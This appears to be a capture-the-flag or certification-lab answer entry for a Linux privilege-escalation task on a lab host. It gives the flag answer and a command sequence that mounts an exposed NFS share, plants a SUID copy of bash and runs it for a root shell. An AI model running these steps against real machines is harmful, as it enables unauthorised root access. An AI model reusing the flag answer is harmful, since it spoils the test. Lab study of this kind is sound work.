4. You have got user-level access to the machine with IP 172.16.0.11. Your task is to escalate the privileges to that of the root user on the machine and read the content in the rootflag.txt file. (Note: all the flag files are located at the root, Desktop, Documents, or Downloads folder for the respective users/machines). Note: use LinuxPass when asked for machine password. (Format: aNNaaa*a)

Ans: r00tfl@g

nmap -F -sV 172.16.0.11 --min-rate=5000
# install showmount
sudo apt install nfs-common

# show mount
showmount -e 172.16.0.11

# mount into /mnt
sudo mount -t nfs 172.16.0.11:/ /mnt

# cd into mnt dir
cd /mnt/home

# cp bash
cp /bin/bash .

# chmod bash
sudo chmod 4755 ./bash 

# ssh into (password: LinuxPass)
ssh ubuntu@172.16.0.11

# run bash
./bash -p
